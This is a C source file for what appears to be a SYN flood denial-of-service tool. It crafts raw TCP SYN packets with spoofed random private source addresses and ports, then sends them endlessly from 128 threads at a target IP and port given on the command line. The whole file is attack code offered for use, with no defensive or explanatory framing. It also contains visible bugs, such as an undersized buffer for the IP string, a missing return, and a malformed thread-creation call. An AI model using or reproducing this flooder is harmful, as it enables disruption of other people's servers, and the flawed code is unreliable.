#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define MAXCHILD 128

char* srcIP;
char dstIP[20] = { 0 };
int dstPort;


typedef struct FAKE_Header {
    unsigned int srcIP;
    unsigned int dstIP;
    unsigned char zero;
    unsigned char protocol;
    unsigned short tcp_len;
}FAKE_H;

typedef struct IP_Header {
    unsigned int ihl;
    unsigned int version;
    unsigned char tos;
    unsigned short total_len;
    unsigned short id;
    unsigned short frag_and_flags;
    unsigned char ttl;
    unsigned char protocol;
    unsigned short checksum;
    unsigned int srcIP;
    unsigned int dstIP;
}IP_H;

typedef struct TCP_Header {
    unsigned short sport;
    unsigned short dport;
    unsigned int seq;
    unsigned int ack;
    unsigned char lenres;
    unsigned char flag;
    unsigned short win;
    unsigned short sum;
    unsigned short urp;
}TCP_H;

int rand_port() {
    return (rand() + 4444) % 15000; 
}

int fastrand(int active){ // Linear Congruential Generator
	return rand();
}

char* rand_ip(int frand, char* ipAddress){
    unsigned char type = rand() % 3, b1, b2, b3;
    switch(type){
        case 0: //10.0.0.0/8
            b1 = fastrand(frand) & 0xFF; // % 256
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "10.%d.%d.%d", b1, b2, b3);

        break;
        
        case 1: //172.16.0.0/12
            b1 = (fastrand(frand) & 0xF) + 16; // % 16
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "172.%d.%d.%d", b1, b2, b3);
        break;
        
        case 2: //192.168.0.0/16
            b1 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "192.168.%d.%d", b1, b3);
        break;
    }
}


unsigned short check_sum(unsigned short* buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        sum += *(unsigned char*) buffer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += sum >> 16;
    return (unsigned short *) (~sum);
}


void syn_flooding () {

    int packet_count = 0;
    int PACKET_SIZE = sizeof(struct iphdr) + sizeof(struct tcphdr);
    int flag = 1, s = -1;
    char buffer[PACKET_SIZE], sendbuffer[PACKET_SIZE];
    struct sockaddr_in *sa;
    struct iphdr *ip_h;
    struct tcphdr *tcp_h;
    FAKE_H *fake_h;
    

    sa = (struct sockaddr_in*) malloc (sizeof(struct sockaddr_in));
    ip_h = (struct iphdr*) malloc (sizeof(IP_H));
    tcp_h = (struct tcphdr*) malloc (sizeof(TCP_H));
    fake_h = (FAKE_H*) malloc (sizeof(FAKE_H));

    memset(sa, 0, sizeof(struct sockaddr_in));
    memset(ip_h, 0, sizeof(struct iphdr));
    memset(tcp_h, 0, sizeof(struct tcphdr));
    memset(fake_h, 0, sizeof(fake_h));
    sa->sin_family = AF_INET;
    sa->sin_addr.s_addr = inet_addr(dstIP);
    sa->sin_port = htons(dstPort);

    s = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if ( s < 1 )  {
        perror("Error with socket...");
        exit(1);
    }

    if( setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char*)&flag, sizeof(flag)) < 0 ) {
        perror("Error with setsockopt...");
        exit(1);
    }
    while (1) {
    // init headers
        rand_ip(0, srcIP);

        ip_h->ihl = 5;
        ip_h->version = 4;
        ip_h->tos = 0;
        ip_h->tot_len = PACKET_SIZE;
        ip_h->id = 1;
        ip_h->frag_off = 0;
        ip_h->ttl = 255;
        ip_h->protocol = IPPROTO_TCP;
        ip_h->check = 0;
        ip_h->saddr = inet_addr(srcIP);
        ip_h->daddr = inet_addr(dstIP);

        tcp_h->source = htons(rand_port());
        tcp_h->dest = htons(dstPort);
        tcp_h->seq = 0;
        tcp_h->ack_seq = 0;
        tcp_h->doff = 5;
        tcp_h->fin = 0;
        tcp_h->syn = 1;
        tcp_h->rst = 0;
        tcp_h->psh = 0;
        tcp_h->ack = 0;
        tcp_h->urg = 0;
        tcp_h->window = htons(5840);
        tcp_h->check = 0;
        tcp_h->urg_ptr = 0;

        fake_h->srcIP = inet_addr(srcIP);
        fake_h->dstIP = inet_addr(dstIP);
        fake_h->zero = 0;
        fake_h->protocol = IPPROTO_TCP;
        fake_h->tcp_len = htons(20);


        memset(buffer, 0, PACKET_SIZE);
        memcpy((void*) buffer, (void*) ip_h, sizeof(IP_H));
        ip_h->check = check_sum( (unsigned short*) buffer, sizeof(struct iphdr));

        memset(buffer, 0, PACKET_SIZE);
        memcpy((void*) buffer, (void*) fake_h, sizeof(FAKE_H));
        memcpy((void*) (buffer + sizeof(FAKE_H)), (void*) tcp_h ,sizeof(struct tcphdr));
        tcp_h->check = check_sum((unsigned short*) buffer, sizeof(FAKE_H) + sizeof(struct tcphdr));

        memset(sendbuffer, 0, PACKET_SIZE);
        memcpy((void*) sendbuffer, (void*) ip_h, sizeof(struct iphdr));
        memcpy((void*) (sendbuffer + sizeof(struct iphdr)), (void*) tcp_h, sizeof(struct tcphdr));
        if (sendto(s, sendbuffer, PACKET_SIZE, 0, (struct sockaddr *) sa, sizeof(struct sockaddr)) < 0) {
            perror("failed to send...");
            pthread_exit("fail");
        } else {
            printf("Sent out!! Thread %d -> Packet %d ...", getuid(), ++packet_count);
            printf("srdIP:%s:%d\t", srcIP, ntohs(tcp_h->source));
            printf("dstIP:%s:%d\n", dstIP, ntohs(tcp_h->dest));
        }
        printf("tcphdr sport -> %d\n", ntohs(tcp_h->source));
    }
    close(s);
}

void attack() {
    int err;
    pthread_t pthread[MAXCHILD];
    for (int i = 0; i < MAXCHILD; i++) {
        err = pthread_create(&pthread[i], NULL, syn_flooding);
        if (err != 0) {
            perror("pthread_create()");
            exit(1);
        }
    }
    for (int i = 0; i < MAXCHILD; i++) { 
        err = pthread_join(pthread[i], NULL);
        if (err != 0) {
            perror("pthread_create()");
            exit(1);
        }
    }
}

int main (int argc, char* argv[]) {
    // signal(SIGINT, sig_int);
    srcIP = (char*) malloc(sizeof(20));
    strcpy(dstIP, argv[1]);
    dstPort = atoi(argv[2]);
    srand(time(NULL));
    fastrand(time(NULL));
    attack();
    return 0;
}